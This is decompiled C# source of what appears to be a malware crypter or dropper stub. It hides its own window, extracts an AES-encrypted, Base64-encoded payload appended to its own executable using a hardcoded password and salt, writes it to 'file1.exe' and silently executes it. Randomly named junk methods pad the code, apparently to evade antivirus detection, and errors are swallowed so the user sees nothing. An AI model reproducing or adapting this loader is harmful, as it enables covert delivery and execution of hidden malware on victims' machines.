using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace NYEDownload;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> __ENCList;

	private IContainer components;

	private string sStub;

	[DebuggerNonUserCode]
	static Form1()
	{
		__ENCList = new List<WeakReference>();
	}

	[DebuggerNonUserCode]
	public Form1()
	{
		((Form)this).add_Load((EventHandler)HuGAKPNFcKulmbJeGMaoPsl);
		__ENCAddToList(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(10, 10);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void dlZjeSbQupWcSkWjkdTJArF()
	{
		Conversions.ToString(1211907);
		Conversions.ToString(1805647);
		Conversions.ToString(1890164);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void HuGAKPNFcKulmbJeGMaoPsl(object sender, EventArgs e)
	{
		try
		{
			((Control)this).set_Visible(false);
			((Control)this).Hide();
			string text = "8bda087801ee923b02ff7a5447b6c9b8416da33aed3536bc3aad1bf463442db5";
			string password = "3p699792sq691s854374n76841899n6p867nqr2r4247707436n4776oo38083sn";
			FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
			sStub = Strings.Space(checked((int)FileSystem.LOF(1)));
			FileSystem.FileGet(1, ref sStub, -1L, false);
			FileSystem.FileClose(new int[1] { 1 });
			string[] array = Strings.Split(sStub, text, -1, (CompareMethod)0);
			string text2 = array[1];
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(password, salt);
			Conversions.ToString(1756190);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
			MemoryStream memoryStream = new MemoryStream();
			CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
			try
			{
				byte[] array2 = Convert.FromBase64String(text2);
				cryptoStream.Write(array2, 0, array2.Length);
				cryptoStream.Close();
				text2 = Encoding.UTF8.GetString(memoryStream.ToArray());
				Conversions.ToString(1146242);
				Conversions.ToString(1739882);
				Conversions.ToString(1268978);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			FileSystem.FileOpen(1, "file1.exe", (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
			FileSystem.FilePut(1, text2, -1L, false);
			FileSystem.FileClose(new int[1] { 1 });
			Interaction.Shell("file1.exe", (AppWinStyle)1, false, -1);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		((Form)this).Close();
		Conversions.ToString(2614039);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void uniCvoqoDUfJFCHjBUQRBVS()
	{
		Conversions.ToString(1464739);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void LMgfpUwaUQMdsVYvYsaOYgh()
	{
		Conversions.ToString(2093696);
		Conversions.ToString(1901834);
		Conversions.ToString(2595474);
		Conversions.ToString(2088113);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void hQGCurSksimOSBQpgFRVvJV()
	{
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void XEmqORtvSwGYquTjaLclbgs()
	{
		Conversions.ToString(2170514);
		Conversions.ToString(2166041);
		Conversions.ToString(2759680);
		Conversions.ToString(1298047);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void NpVheoXJpNWhRqVdVQoEHGS()
	{
		Conversions.ToString(7717307);
		Conversions.ToString(1010666);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void bPTNZUdsJJDEGNmqrpBCeRh()
	{
		Conversions.ToString(1380447);
		Conversions.ToString(1385965);
		Conversions.ToString(1979604);
		Conversions.ToString(2552344);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void RDDEprHGgWTOeJokmvNSLnH()
	{
		Conversions.ToString(2674089);
		Conversions.ToString(1198693);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void nGaYvRaQIpuwFmgeuHDZiRt()
	{
		Conversions.ToString(4781004);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void VOhYDtoDYgQrsYKqGcjgOYt()
	{
	}
}
